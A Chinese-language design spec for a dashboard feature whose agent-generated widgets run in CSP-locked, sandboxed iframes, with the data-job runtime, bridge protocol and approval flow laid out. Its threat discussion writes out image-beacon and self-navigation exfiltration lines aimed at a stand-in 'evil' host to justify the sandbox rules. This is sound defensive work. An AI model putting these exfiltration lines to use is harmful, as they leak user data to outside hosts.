# Spec: Workbench Board（看板 / 小组件 / 取数作业）

**Status:** implementation in progress（#133–#139 已落地；刷新 UI / 示例板 / agent 面契约未交付）
**Map:** [#111 Workbench Board 首版可执行规格](https://github.com/xiaowen-0725/uilab-admin/issues/111)
**ADR:**

- [0021-workbench-csp-and-widget-subdocument-policy](../adr/0021-workbench-csp-and-widget-subdocument-policy.md)
- [0022-board-module-entities-and-split-write-channel](../adr/0022-board-module-entities-and-split-write-channel.md)
- [0023-widget-data-job-deno-runtime-and-one-time-consent](../adr/0023-widget-data-job-deno-runtime-and-one-time-consent.md)

**Vocabulary:** 根 [`CONTEXT.md`](../../CONTEXT.md)（Board / Board Widget / Widget Data Job 三条已登记）
**Research:**

- [board-widget-srcdoc-sandbox-2026-08-15](../research/board-widget-srcdoc-sandbox-2026-08-15.md)（不透明源沙箱实测）
- [board-write-channel-client-side-tool-2026-08-15](../research/board-write-channel-client-side-tool-2026-08-15.md)（client-side tool 上限）
- [widget-data-job-sidecar-paths-2026-08-15](../research/widget-data-job-sidecar-paths-2026-08-15.md)（侧车执行路径）
- [widget-data-job-runtime-options-2026-08-15](../research/widget-data-job-runtime-options-2026-08-15.md)（运行时选型）

**Prototype:** `prototype/board-ui`（commit `cdd8ab7`），跑法与截图见 [`archetypes/agent-workbench/prototype/README.md`](../../archetypes/agent-workbench/prototype/README.md)
**Related (do not reinvent):** [real-task-lifecycle-spec](./real-task-lifecycle-spec.md)、[workbench-capability-surface-spec](./workbench-capability-surface-spec.md)、[workbench-default-permissions-design](./workbench-default-permissions-design.md)
**前置依赖:** [#124 事件协议 v2](https://github.com/xiaowen-0725/uilab-admin/issues/124) 先落地（理由见 §12）

**Revision notes — 汇编期归一（本文档是这些冲突的唯一裁决处）:**

- **2026-08-16a｜SDK 全局名统一为 `widget`。** #117 定稿写作 `board.data` / `board.ready()`，#121 原型实现为 `widget.*`。取 `widget`：SDK 是 widget 作用域的，widget 看不见也不该看见 Board，`board.*` 会诱导模型以为能读写整块板。
- **2026-08-16b｜提交接口统一为 `widget.submit(payload)`。** #117 写作 `emit('submit', payload)`。取具名方法：全族只有这一个事件，`emit` 暗示一个不存在的事件家族，且具名方法在 prompt 里更好教。
- **2026-08-16c｜`saveInput` 取 #117 的分键形态**（`saveInput(key, value)` / `getInput(key)`），不取 #121 原型的整块 blob 形态。分键有配额依据（单 key ≤ 32 KiB、单 widget ≤ 16 key），且避免每次存草稿都要读改写整块。
- **2026-08-16d｜区分两个「ready」。** 桥握手的 `ready` 是 SDK 自动回的，不进 SDK 表面；`widget.ready()` 是 widget 说「我画完了」，是 `board_widget_finish` 校验的那一条（#119）。#121 原型把两者合并了，实施期须拆开。
- **2026-08-16e｜`WidgetJobRunRecord.artifactRef` 首版不填。** #115 按 `/workspace/file`（1.5 MiB）定义了它，#128 改为端点直接回传（512 KiB）。字段保留，v1 恒空。
- **2026-08-16f｜审批「独立种类」措辞作废。** 代码里没有 approval kind 注册表，粒度就是工具名（#132）。见 §5.4。
- **2026-08-16g｜IDB 清库风险范围收窄。** #115 称「任何新增的非协议 store 都会被下一次协议升级顺带清掉」。核对代码后更准确的表述是：现有清库分支被 `oldVersion >= 1 && oldVersion < 2` 界定（`workbench-idb-schema.ts:96-100`），**不会**碰到 Board 的 v3；风险在于**后续**协议升级若照抄这个「全量枚举删除」的写法。见 §2.6。

---

## Problem Statement

用户希望像 Kimi 那样，在对话里让 agent 生成一块「看板」——上面是若干独立渲染的小组件，数据能重复取。Workbench 当前没有任何长期持有的、跨 Task 的用户资产载体：Work Surface 是 task-scoped 的临时视图，Capability Surface 是配置面。

三个真实困难决定了这份规格的形状，它们都不是「写个网格 UI」层面的问题：

1. **agent 生成的 HTML 要在渲染层跑起来，同时不能拿到宿主的任何权限**。srcdoc 子文档强制克隆宿主的 policy container，而本仓宿主**当前完全没有 CSP**——今天能跑是偶然状态，任何人日后给宿主加一条 CSP 就会让全部看板静默黑屏。
2. **侧车工具写不了渲染层的 IDB**，而 IDB 是已锁的权威（ADR-0015）。一份 30 KB 的 widget HTML 怎么从模型手里搬到 IDB 里，是本规格最关键的架构决策。
3. **「取数」意味着执行 agent 写的代码并访问网络**，而 Workbench 现有的隔离基建在网络维度不可表达（`sandbox-exec` 只有一个布尔），Task 链路又整条是 task-scoped 的，而看板刷新时没有 Task。

## Solution

Board 是应用级全局实体，由新增 Deep Module `modules/board` 拥有，持久化在既有统一 IDB 上（additive bump 到 v3）。widget 是 agent 生成的单文件 HTML，跑在 `srcdoc` 不透明源 iframe 里，宿主同时用 `sandbox` 与 iframe `csp=` 属性把它封成「无网络、无存储、无导航、无远程资源」。

内容与控制走两条通道：模型分片写入**侧车侧**工具的 staging，渲染层用**一次**极小的 client-side tool 提交并经普通 HTTP 端点把内容拉回来落库。取数作业是 Deno 子进程，网络白名单在创建时声明、审批一次、之后静默执行；执行走侧车一条**不注册为 tool** 的 HTTP 端点，因此不需要 Task。

## Goals / Non-goals

### Goals

1. 用户可在对话里说「做一块看板」，agent 生成若干 widget 并落成用户长期持有的资产。
2. widget 可重复取数（手动触发），数据由取数作业提供；widget 自身**永不直连外网**，且这一点由机制强制而非口头约定。
3. Board 的存在与可用性**不依赖侧车**：无侧车时看板仍可浏览与拖拽，只有取数不可用，且不可用原因如实呈现。
4. 首版即做真沙箱作业运行时，不走「先给个 HTTP GET 工具」的过渡原语。
5. 三处复用同一套渲染：详情页、会话内预览、列表页缩略图。

### Non-goals（首版）

- **定时调度**（模型层预留 `trigger`，无调度器、无启停 UI）。
- **需要认证的数据源**（只支持公开端点；不复用 connector 凭据、不持用户密钥）。
- **agent 删除任何东西**（Board / widget / job 都只能由用户在 UI 上删）。
- Timeline 内联单个 widget、批注模式、「整理」自动布局、「做同款」、固定至桌面、导出/导入/同步、widget 版本历史、同一 widget 放置到多块 Board。
- SDK 的 `files` 与 `allow-downloads`。

## Vocabulary (normative pointers)

三条已登记在根 `CONTEXT.md`，此处只强调易混点：

- **Board**：只拥有放置与布局，不拥有 widget 的实现与数据。**应用级全局**，不隶属 Project 或 Task。
- **Board Widget**：一块可独立渲染的单元；实现是单文件 HTML/JS，跑在不透明源沙箱内。
- **Widget Data Job**：widget 外部数据的**唯一**来源。

**不要混用**：Board ≠ Work Surface（后者 task-scoped）；Widget Data Job ≠ Runtime Command / Tool Call（前者不走 agent loop）。

---

## 1. Normative: 领域模型与持久化

### 1.1 四个 store，全部 keyPath `'id'`

| Store | 主键 | 索引 | 拥有者 |
|---|---|---|---|
| `boards` | `id` | — | `modules/board` |
| `boardWidgets` | `id` | — | `modules/board` |
| `widgetDataJobs` | `id` | `widgetId`（unique） | `modules/board` |
| `widgetJobRuns` | `id` | `jobId` | `modules/board` |

形状照 `projects`（keyPath `'id'`、全局实体、由 module 自己的 adapter 拥有）。

**为什么 run 记录不内嵌进 job 行**：生命周期不同（滚动裁剪、可丢弃）；`commands` 已确立「同 db 内不参与 Task 级联删除的旁路记录表」先例；最要紧的是**避免每次状态跳动都重写那行装着已批准代码与哈希的记录**。
**为什么 job 不内嵌进 widget 行**：同理，widget 行装着可达数十 KB 的 HTML，改作业代码不该重写它。

### 1.2 Board

```ts
interface BoardRecord {
  id: string
  title: string
  purpose?: string          // 给模型读的意图，非用户可见
  isExample: boolean
  presetId?: string         // 示例板溯源（§9）
  presetVersion?: number
  placements: BoardPlacement[]
  createdAt: string
  updatedAt: string
  createdByTaskId?: string  // 纯溯源，允许悬空
}
interface BoardPlacement {
  mountId: string           // 与 widgetId 分离
  widgetId: string
  x: number; y: number; w: number; h: number   // grid 单位
}
```

- **`mountId` 与 `widgetId` 分离必须保留**：这是「同一 widget 放多块板」的唯一缝隙，代价一个字段，事后补要改所有 placement 的读写路径。首版不开放该产品语义。
- **布局几何常量不入库**（12 列 / 列宽 80 / 行高 32 / 间距 12 写在代码里）。入库等于把常量变成需要迁移的数据。
- **不保留 grid / free 双布局记忆**，也**不预留凭据字段**。判据与 `trigger` 形成对照：`trigger` 必须预留是因为 schedule 会**改变 job 的语义**；free 布局与凭据只是**加字段**，不改现有语义。
- widget 的 min / default / max span 归 widget 自己声明，不放 placement。

### 1.3 Board Widget

```ts
interface BoardWidgetRecord {
  id: string
  title: string
  html: string                    // 字符串入库
  slots?: { main?: DataSlotSpec }
  events?: { submit?: SubmitSpec }
  span: { min: Span; default: Span; max: Span }
  latestData?: unknown            // 仅在 run success 时写入
  latestDataAt?: string
  status: 'idle' | 'running' | 'error' | 'cancelled'
  lastRunId?: string
  createdAt: string
  updatedAt: string
  createdByTaskId?: string
}
```

- **「失败 / 超时 / 取消不覆盖上次成功数据」由结构保证**，不靠调用方自律：`latestData` **只在 run 成功时写入**，失败路径只改 `status` 与 `lastRunId`。
- **状态机四态**，从 Kimi 的六态精简。去掉 `needs_input`（首版取数无交互式追问）与 `degraded`（我们没有任何产生降级态的来源）。**一个永不产生的状态是误导，不是余量。**「有数据 / 无数据」由 `latestData` 是否存在表达，不占状态位。

### 1.4 Widget Data Job：`approved` 与 `pendingChange` 分离

```ts
interface WidgetDataJobRecord {
  id: string
  widgetId: string                // unique：一个 widget 至多一个 job
  title: string                   // 用户可见
  description: string             // 用户可见
  purpose?: string                // 给模型读
  enabled: boolean                // 首版 UI 不暴露，语义先在
  trigger: { kind: 'manual' }     // 预留 once / schedule / interval / condition
  resultSchema?: unknown
  timeoutMs?: number
  approved?: {                    // 执行期唯一依据
    code: string
    codeHash: string
    allowedHosts: string[]
    approvedAt: string
    approvedInTaskId: string
  }
  pendingChange?: {
    code: string
    allowedHosts: string[]
    requestedAt: string
  }
  createdAt: string
  updatedAt: string
}
```

**必须把已批准的代码本身连同哈希一起快照**，而不是只存哈希——只存哈希会出现「用户改了代码但未获批，此时该跑哪份」的歧义，甚至跑出一份我们手上没有的代码。执行期只读 `approved`：

- 没有 `approved` → **job 不可运行**（不是「用当前代码跑」）；
- 有 `pendingChange` → 不影响运行，仍跑 `approved`，直到该变更获批后**原子替换** `approved` 并清空 `pendingChange`；
- 执行前校验待跑代码哈希等于 `approved.codeHash`（第二道闸，第一道是目录布局，见 §7.3）。

### 1.5 Run 记录

```ts
interface WidgetJobRunRecord {
  id: string
  jobId: string
  widgetId: string
  startedAt: string
  finishedAt?: string
  status: 'running' | 'success' | 'error' | 'timeout' | 'cancelled'
  errorMessage?: string
  artifactRef?: string            // 首版恒空（Revision note 2026-08-16e）
}
```

每个 job 保留**最近 10 条**，裁剪在写入时同步做，不留后台任务。首版 UI 只消费最近一条。

### 1.6 删除语义

| 操作 | 级联 |
|---|---|
| 删 Board | 级联删该板独占的 widget → 其 job → 其 runs。不级联会留下不可达的孤儿 widget（首版无 widget 库页面）。 |
| 删 widget | 级联删其 job 与 runs，并从所有 Board 的 `placements` 中移除。 |
| 删 job | **不**删 widget。widget 保留 `latestData`（历史数据仍可看），`status` 归 `idle`，从此不能刷新。 |
| 删 Task | **完全不影响 Board。** 四个新 store 不参与 `deleteTaskCascade`；`createdByTaskId` 允许悬空，不做外键约束。 |

### 1.7 上限校验的落点

每块 Board 的 widget 数上限（20）校验落在 **`modules/board` 的 application 层**：IDB 表达不了，UI 层会被工具族写入绕过。工具族与 UI 拖拽经**同一条 command 路径**写入，校验只此一处。

## 2. Normative: IDB 迁移

1. Board 的四个 store 在 #124 落地**之后** additively bump 到 **v3**，不搭 #124 那次车（两个 effort 的失败面互不牵连）。
2. Board 的 bump **必须纯增量**：只 `createObjectStore`，不得删除任何既有 store。
3. 需在 `WorkbenchStoreName` / `ALL_STORE_NAMES` 登记四个新名字（`workbench-idb-schema.ts`）。
4. 现有清库分支被 `oldVersion >= 1 && oldVersion < 2` 界定，**不会**碰 v3。但**后续协议升级不得照抄** `Array.from(db.objectStoreNames)` 全量删除的写法——Board 是全局用户资产，不该因协议升级丢失。已向 #124 提出显式枚举的请求。

## 3. Normative: CSP 与沙箱（详见 ADR-0021）

### 3.1 宿主文档 CSP（单一来源：`index.html` meta）

```
default-src 'self';
script-src  'self' 'nonce-<PER_LOAD>';
style-src   'self' 'unsafe-inline';
img-src     'self' data: blob:;
font-src    'self' data:;
connect-src 'self' http://127.0.0.1:<SIDECAR_PORT> <ws://localhost:5174 仅 dev>;
frame-src   'self';
object-src  'none';
base-uri    'none';
form-action 'none';
```

Electron 走 `loadURL(DEV_URL)` 加载同一份文档，故 meta 同时覆盖 dev / preview / 打包 / 桌面四种形态——**不需要** Electron `onHeadersReceived`，也**不需要** vite `server.headers`。**不得出现 `'unsafe-eval'`。**

### 3.2 widget iframe 属性（两者必须成对存在）

```
sandbox="allow-scripts"
csp="default-src 'none'; script-src 'nonce-<SAME>'; style-src 'unsafe-inline';
     img-src data: blob:; font-src data:; connect-src 'none'; frame-src 'none';
     form-action 'none'; base-uri 'none'; object-src 'none'"
```

- **绝不加 `allow-same-origin`**：实测该组合下子文档可读宿主 DOM、可写宿主 localStorage、并能删掉自己的 `sandbox` 属性。
- `allow-forms` / `allow-downloads` / `allow-popups` / `allow-modals` 一律不给。
- widget 侧 `'self'` 解析为不透明源，等于什么都不给——这正是我们要的。**反直觉的一点**：继承策略里的 `'self'` 解析到**宿主源**，所以宿主若写 `connect-src 'self'`，反而**允许** widget 直接打我们的侧车。这是 iframe `csp=` 加严不可省的原因。
- **不得复用** `modules/work-surface/surfaces/browser/url-utils.ts` 的 `sandboxForTrust()`（其 localhost 分支正是 `allow-scripts` + `allow-same-origin`）。

### 3.3 为什么必须封 `img-src` 与 `frame-src`

`new Image().src = 'https://evil/?d=' + data` 与**自导航**（`location = 'https://evil/?d=...'`）**都不受 `connect-src` 管**，而自导航只能由**宿主**的 `frame-src` 表达（`frame-src` 管父文档嵌入子框架，不管子框架跳自己；`sandbox` 缺 `allow-top-navigation` 只挡顶层跳转）。所以「宿主不加 CSP」这个选项出局——它换不到简单，只换到一个我们已宣称封住、实际没封住的漏洞。

### 3.4 产品代价（会传导到生成侧）

**widget 不能加载任何远程资源。** 远程图片、远程字体、CDN 图表库全部不可用。需要配图时由取数作业下载后内联成 `data:` 放进产物。**widget 必须完全自包含。**

## 4. Normative: 宿主桥协议

### 4.1 交付：agent 产出完整 HTML，渲染层做确定性改写

模型产出完整单文件 HTML。**渲染层**（不是侧车——nonce 是宿主当次的值，侧车不持有）在拼 srcdoc 时做三件确定性改写：

1. 给所有 `<script>` 盖上宿主当次的 nonce（不盖则被继承的宿主 `script-src` 拦掉）。
2. 在 `<head>` 最前插入桥 JS + bootstrap 数据（同样带 nonce）——桥必须在 widget 代码之前存在。
3. 注入宿主基础样式与**主题 CSS 变量**（内联 `<style>`，`style-src 'unsafe-inline'` 已授予）。

**不需要 revision 机制**：给 `srcdoc` 赋值即导航，字符串完全相同也会重载。卸载归零用 `src='about:blank'`，再次使用 srcdoc 前 `removeAttribute('src')`。

### 4.2 握手：只有第一跳需要校验

```
宿主：iframe load 完成 → postMessage({ type:'board:init', token }, '*', [port2])
桥：  收到 → 校验 event.source === window.parent → 接过 port → 回 { type:'ready' }
此后所有流量走 MessagePort
```

- `targetOrigin` **只能是 `'*'`**（传 `'null'` 抛 `SyntaxError`，传宿主 origin 不投递）。
- 宿主侧校验 `event.source === iframe.contentWindow`；**token 只是关联手段，不是安全边界**。
- 建立 port 之后是点对点通道，不再需要 origin 校验——**「不透明源没法校验来源」只影响握手这一跳**。
- **widget 主体代码必须在 `init` 送达之后才执行**（#121 原型撞出的竞态：握手时就跑会让启动代码读到空 `data`）。这是 SDK 的实现责任，不是 widget 作者的责任。

### 4.3 SDK 表面（首版全集）

```ts
widget.data                        // 当前快照，同步可读
widget.onDataChange(cb)            // 注册即立刻回放当前快照
widget.theme                       // 'light' | 'dark'
widget.onThemeChange(cb)
widget.resize(heightPx)            // 请求高度，宿主决定是否采纳
widget.saveInput(key, value)       // 草稿持久化；单 key ≤ 32 KiB、单 widget ≤ 16 key
widget.getInput(key)               // 同步读（随 init 下发，避免异步初始化）
widget.submit(payload)             // 触发该 widget 的作业并把新数据投回
widget.openLink(url)               // 宿主中介打开外链
widget.capabilities                // { canSubmit: boolean }
widget.ready()                     // 内容级就绪信号；board_widget_finish 校验它必须被调用
```

- **`onDataChange` 注册即回放当前快照**，目的是让 widget **只有一条渲染路径**。这直接对应「初始化必须幂等」那条硬规则——模型最容易犯的错是在 init 和 change 两处各写一遍渲染逻辑。
- **`saveInput` / `getInput` 不是可选项而是必需**：不透明源下所有源绑定存储全灭（localStorage / sessionStorage / IndexedDB / cookie / CacheStorage / ServiceWorker 全抛 `SecurityError`），番茄钟、待办打卡这类 widget **没有任何本地持久化手段**。
- **分工**：无作业的 widget 用 `saveInput` 存自己的状态；`submit` 只在该 widget 有作业时可用，由 `capabilities.canSubmit` 告知。
- **主题变量**：宿主注入一小组 CSS 变量（背景 / 前景 / 次要文字 / 边框 / 上涨 / 下跌），随主题切换更新。没有它，每个生成的 widget 都要手搓深浅两套配色（#121 实测）。

### 4.4 安全边界

- **桥上永不出现凭据、绝对路径、或除 widget 自身 id 外的宿主信息。** 首版作业不持凭据，所以 data 快照天然无秘密——这是当前风险面小的根因，不是运气。
- `openLink` **只收 http / https**，拒绝 `file:` / `data:` / `blob:` / `javascript:`；交给宿主既有外链策略，**不做逐次确认**（每点一条资讯弹一次确认是不可用的体验）。
- 单条消息 ≤ **512 KiB**，超限宿主丢弃并回一条 hint。
- 宿主对 widget 发来的所有消息做 schema 校验；未知 type 丢弃不报错（向前兼容）。

### 4.5 健壮性：ready 超时 + 自做心跳

`MessagePort.onclose` 在 Chromium 不可用（规范已合并但 M122 因安全评审 revert），Kimi 那套存活探测不可复制。

| 机制 | 参数 | 动作 |
|---|---|---|
| ready 超时 | 8 秒 | 自动重载，最多 2 次，仍失败则显示宿主绘制的错误态 |
| 心跳 | 每 5 秒 ping，连续 3 次无 pong（15 秒）判死 | 显示错误态 + 「重新加载」按钮，**不自动重载** |

- **pong 由桥自动回复**，不经 widget 代码——widget 作者无法也无需参与，因此写坏 widget 不会导致误判为死。反过来，**同步死循环会阻塞事件循环从而停发 pong**，正是我们要检出的形态。
- 判死后不自动重载：死循环 widget 自动重载会反复烧 CPU。ready 超时那条允许自动重载，因为那多半是瞬时加载问题。
- **心跳只在详情页与预览面板启用，列表页缩略图不启用。**

### 4.6 滚轮转发由桥所有

不透明源 iframe 内的 `wheel` **不会冒泡到父文档**，所以鼠标悬停在 widget 上滚动时画布不动——这是必然出现的体验 bug，不是边缘情况。解法：**桥**监听 widget 文档的 `wheel`，当「widget 内无可滚动祖先」或「已滚到边界」时把 `deltaY` 经 port 转发给宿主。因此硬规则里必须写明「widget 不要监听 wheel 并 `preventDefault`」。

### 4.7 宿主 chrome 与桥的边界

- **「刷新」是宿主动作**：宿主直接调作业执行端点，**不给 widget 发 postMessage**；拿到新产物后经 `data` 消息投给 widget。widget 对刷新完全无感，只会看到数据变了——这正是「只有一条渲染路径」的收益。
- **「全屏」是纯宿主几何**，**不加视口消息**：widget 用 `ResizeObserver` 自观测（web 标准做法，少一条协议）。
- **「更多」是宿主菜单**（取数作业弹窗等，§9.3）。

## 5. Normative: 写入通道与工具族（详见 ADR-0022）

### 5.1 两条通道

| 面 | 通道 |
|---|---|
| **内容**（widget HTML、作业代码） | 模型分片写入 → **侧车侧工具**落到 `~/.uilab/runtime/board-{widgets,jobs}/<id>/staging/`（普通 agent loop 内调用，**不挂起渲染层**） |
| **控制 / 提交** | **一次**极小的 client-side tool，payload 只有 id 与 hash |
| **内容回渲染层** | 渲染层经 board module 的 port 调侧车普通 HTTP 端点拉取 |

**关键观察：内容不需要经过模型往渲染层搬。** 单次写入的天花板在**模型输出层**（30 KB HTML 转义后需一次吐 8k–12k token，且侧车未配 `maxOutputTokens` 与 `experimental_repairToolCall`），所以必须分片；但**分片的落点不必是渲染层**。若分片走 client-side tool，就是十几次挂起-恢复，每次重发整个上下文（成本近似二次增长），且每次都暴露在「挂起状态无 TTL、刷新即静默作废」的风险里。改成侧车侧分片、渲染层最后拉取，往返从十几次降到**一次**。

### 5.2 工具清单

**侧车侧（agent loop 内执行，不挂起渲染层，免审批）**

| 工具 | 入参 | 返回 |
|---|---|---|
| `board_widget_begin` | `{ title, widgetId? }` | `{ widgetId, buildId }` |
| `board_widget_append` | `{ widgetId, buildId, seq, chunk }` | `{ received, nextSeq }` |
| `board_widget_finish` | `{ widgetId, buildId }` | `{ widgetId, contentHash, bytes }` 或校验错误 |
| `board_job_begin` | `{ widgetId, title, description, allowedHosts[] }` | `{ jobId, buildId }` |
| `board_job_append` | `{ jobId, buildId, seq, chunk }` | `{ received, nextSeq }` |
| `board_job_finish` | `{ jobId, buildId }` | `{ jobId, codeHash }` — **需审批** |

**client-side（渲染层执行，共两个，均不得并行调用）**

| 工具 | 入参 | 返回 |
|---|---|---|
| `board_status` | `{ boardId? }` | `{ boards[], committed[], staging[] }` |
| `board_commit` | `{ boardId? \| newBoardTitle?, widgetId, contentHash, jobId?, codeHash? }` | `{ boardId, widgetId, mountId, placement, jobId? }` |

- **`board_status` 必须是 client-side**：它要回答「哪些 widget 已落库」，而权威是渲染层 IDB，**权威读必须回权威方**——侧车侧镜像恰好会在「用于中断恢复」这个最需要准确的场合失效（用户可能刚在 UI 上删了东西）。
- **`board_commit` 兼任建板**（`boardId` 缺省 + `newBoardTitle`），以保持只有一个写入型 client-side tool。
- **`board_commit` 一次原子提交 widget 与其作业**：`board_job_finish` 是侧车侧工具、写不了 IDB，若不由 commit 兼办，作业记录就没有落库路径。
- **固定调用顺序**：`board_widget_begin/append/finish` → `board_job_begin/append/finish`（此处请求审批）→ `board_commit`。作业必须在 commit 之前完成审批，否则 commit 拒绝并提示。
- 单片 **2–4 KB**。`seq` 连续性由侧车校验。
- **首版 agent 不能删**任何东西。修改既有 widget = 用同一 `widgetId` 走一遍全流程，placement 与 `mountId` 不变。

### 5.3 返回值硬规则

**board 族所有返回值只放标量与短字符串（id / hash / 数字 / 枚举 / 一句 hint），绝不放 HTML、作业产物或任何用户数据。**

这同时解掉一个 footgun：`tool.completed` 的 `summary` 有 4 KB 硬顶，但 `sanitizeToolOutputForEnvelope` 只清洗 `content` / `text` / `data` / `message` / `error` / `hint` 固定键，其它键（例如 Kimi 风格的 `artifact`）会**原样进 envelope 并原样落 IDB**，既无大小上限也不脱敏。我们不去研究哪些键安全，直接让返回值**没有任何值得担心的内容**。

### 5.4 审批语义

| 工具 | 审批 | 依据 |
|---|---|---|
| `board_widget_*`、`board_status` | 免审批 | 写入落在 `~/.uilab/runtime/.../staging/`，**不在用户工作区**；未提交前不进 IDB，用户看不到 |
| `board_commit` | 免审批 | 内容已在本机 staging，落库后用户在 UI 上立刻可见可删。**如实记录：它是 client-side tool，不受 Permission Preset 管控**——不假装它受管 |
| **`board_job_finish`** | **需审批** | 唯一真正授予新能力的动作 |

**落法（代码里没有 approval kind 注册表，粒度就是工具名）**：侧车给 `board_job_finish` 配 `needsApproval: true`，且**不得**加进渲染层 `AUTO_APPROVE_WRITE_TOOLS`（`permission-preset.ts:16-22`）。于是「帮我批准」预设下它天然 dock（白名单外一律 `dock`）。

**审批卡必须展示**：作业标题与说明、**可访问域名清单**、代码规模（行数 / 字节），以及这一句——**「批准后此作业可被重复运行，不再逐次确认」**。这才是用户真正在同意的东西；不写这句，这套「授权一次、运行静默」的模型对用户就是不诚实的。

**已知弱化**：`full-access`（「完全访问」）预设对一切返回 `approve`，该档位下用户永远看不到这张卡。判定为可接受（与 `execute_command` 同等待遇，是用户显式选择的档位），代价是 §9.3 的 UI 硬要求。

### 5.5 校验与失败自修

**`board_widget_finish` 是唯一校验点，且结构上无法被绕过**：staging 只能经 `append` 写入，`finish` 是唯一转正路径，`board_commit` 只接受 ready 且校验 `contentHash` 匹配。（Kimi 踩过的坑是非对称性——`Widget.update` 会自动重校验，但直接写 workspace 文件不会。我们的结构让这种非对称性无法出现。）

校验项（全部静态，不执行 widget）：

1. **seq 完整性** → 有缺口时报明**缺哪一段**，模型只补那一段，不重写整份。
2. HTML 可解析、单一根节点、存在 `<script>`。
3. **CSP 违规静态检测**：内联事件处理器属性（`on*=`）、指向 `http(s)://` 的 `src` / `href`、`eval(` / `new Function(`。
4. **SDK 契约**：声明了 slots 就必须订阅 `onDataChange`；必须调用 `widget.ready()`。
5. 体积上限。

`board_job_finish` 追加：零依赖单文件（无任何 `import`）、导出 `run(ctx)`、`allowedHosts` 非空且为合法主机名。

**错误只回定位信息**（错误码 + 一句可操作 hint + 行号 / 属性名 / 违规片段前 40 字符），**绝不回传整份 HTML**。**自修上限**：同一 `widgetId` 连续校验失败 **3 次**后，`finish` 改为返回「停止重试，请向用户说明问题」——无上限的自修会安静地烧掉一整个 Turn 的预算。

### 5.6 错误码

统一沿用侧车既有形状 `{ ok: false, error: '<snake_case>', hint: '<中文提示>' }`，**不另造**：

`unknown_build` / `build_not_ready` / `hash_mismatch` / `validation_failed` / `csp_violation` / `sdk_contract_violation` / `widget_limit_reached` / `board_limit_reached` / `unknown_board` / `unknown_widget` / `unknown_job` / `already_running` / `runtime_unavailable` / `not_authorized` / `repair_budget_exhausted`

### 5.7 幂等、冲突、失败回滚

- **同一 Turn 多次写**：`board_commit` 以 `(widgetId, contentHash, codeHash?)` 幂等——同内容重复提交是 no-op 并返回同一结果。
- **用户同时拖拽布局**：**agent 的提交只做「追加一个 placement 到首个空位」，绝不整体覆盖 `placements` 数组**。靠写入语义而非锁来避免冲突。
- **两个 Task 同时改同一块 Board**：同上；竞争只可能发生在「同一个 widget 的内容」上，最后提交者胜，且提交者知道自己写的是什么（contentHash）。
- **原子提交**：widget row、job row、board 的 placement 追加在**同一个 IDB 事务**内。不存在「widget 落了、作业没落」或「Board 建了、widget 没落」。
- **被打断时的收敛状态**：IDB 里是已提交的若干 widget，侧车 staging 里是半成品——**干净的未提交**，而不是「一半已落库、剩下永不补齐」。staging 有 TTL 清理，且永不影响 IDB 一致性。
- **可续写**：`board_status` 返回已落库清单 + 各自 contentHash + staging 未提交清单，agent 被打断后能在新 Turn 里问清并续上。

### 5.8 不进事件流

工具族**不得产生 `board.*` 事件族**。Timeline 的投影是**从事件重建**的；若 Board 变更是 Task 事件流里的事件，每次投影重建（刷新、切回该 Task）都会**重新施加一次 Board 变更**，除非再叠一层「已施加」追踪。事件流的既有语义是可重放的叙事，不该混入全局状态变更。事件流里只有普通 tool call 的叙事（`tool.started` / `tool.completed`）。

## 6. Normative: agent 面契约

### 6.1 三层

| 层 | 载体 | 内容 |
|---|---|---|
| C | 主 instructions（进程级静态） | 3 句：工具面出现 `board_*` 时先读 `board-widget` skill；小组件不能联网、外部数据一律经取数作业；**工具不出现时不得声称能做看板** |
| A | 每个工具的 `description` | 何时用 / 参数 / 返回。200–500 字符，对齐 `ask_user_question`（~480 字符）先例 |
| B | `bundled-skills/board-widget/SKILL.md` + `references/` | 写作规范全文，**懒读**，不占常驻 token |

Layer B 走已有机制：boot 时 missing-only 播种到工作区，常驻 prompt 只出现名字+描述（最多 10 条），要用时 `workspace_activate_skill` → `workspace_read_skill`。这正是 Kimi「契约文档以明文 SKILL.md 打进安装包」的对位物。

Layer C 第三句是诚实边界要求：skill 是 boot 时播种的，**即使工具未暴露，`board-widget` 仍会出现在 `workspace_list_skills`**（占 max 10 的一条）。

### 6.2 按 Task 暴露工具

- 新增泛化 context key `capabilityFeatureIds`（数组，而非 `boardEnabled` 布尔，后续功能可复用）→ `CapabilityTurnContext` 加 `selectedFeatureIds: string[]`。
- `create-agent.ts` 的 `tools:` 返回 `[...connectorRuntime.toolsFor(tc), ...(tc.selectedFeatureIds.includes('board') ? boardTools : [])]`。该函数**本就每 Turn 现算**，所以这是零新机制。
- 渲染层在 Turn submit 时写入该 key（既有通道，已在写 `capabilityConnectorIds`）。
- **Task 级开关取并集**：① 从看板入口创建的 Task；② 该 Task 曾成功 `board_commit`。第二条是必需的——否则 resume 老 Task 后就改不动自己建的板。
- **Board 不进 Capability Surface catalog**：它不是 connector（无外部账号）、不是 expert（不是配置包）、不是 skill（skill 是给 agent 读的文档）。首版没有「用户手动勾选看板能力」的 UI。
- 两个 profile（`minimal` / `office`）都注册 board 工具：看板是产品能力，不是办公插件。

### 6.3 固定配方（写进 skill 与 instructions，不让模型自由发挥）

```
建组件：board_status → board_widget_begin → board_widget_append（每片 2–4 KB，seq 从 1 连续）
        → board_widget_finish → board_commit
建作业：board_job_begin（含 allowedHosts）→ board_job_append → board_job_finish（会请求用户批准）
建完之后：无需自行触发首跑，宿主会在提交成功后自动执行一次
```

### 6.4 widget 写作规范（12 条，每条须附「违反时的表现」）

1. 单文件：只产出 `<style>` 内容与 JS 主体，**不引任何外部 URL**。
2. **不联网**：数据只能来自 `widget.data` / `widget.onDataChange`。要外部数据 → 必须配套建取数作业。
3. 主体写成「被 SDK 调用」的形状；**不要**自己 `addEventListener('message')`，**不要**依赖 `DOMContentLoaded`。
4. `data` 可能是 `null`（尚未取数）→ 必须画空态/加载态，不能崩。
5. 状态只走 `widget.saveInput` / `getInput`；**不要** localStorage / sessionStorage / cookie（不透明源下不可用）。
6. 不要 `alert` / `confirm` / `prompt`（未给 `allow-modals`，`confirm()` 直接返回 `false`）；需要确认走 `widget.submit()`。
7. 不要导航或开窗：`window.open`、`location =`、`target="_blank"` 均无效；外链走 `widget.openLink(href)`。
8. **不要画自己的标题栏 / 刷新 / 全屏按钮**——那些是宿主 chrome，只画内容区。
9. 高度自适应：内容直接放 body，调 `widget.resize()`；不要 `height: 100vh`、不要自己滚。
10. **主题用宿主注入的 CSS 变量**并监听 `onThemeChange`；不要只适配浅色。
11. 图表用 `<canvas>` 手绘或内联 SVG，**不引图表库**。
12. 不要 `eval` / `new Function` / 动态 `import()`；不要内联事件处理器（nonce 覆盖不到），只能 `addEventListener`。
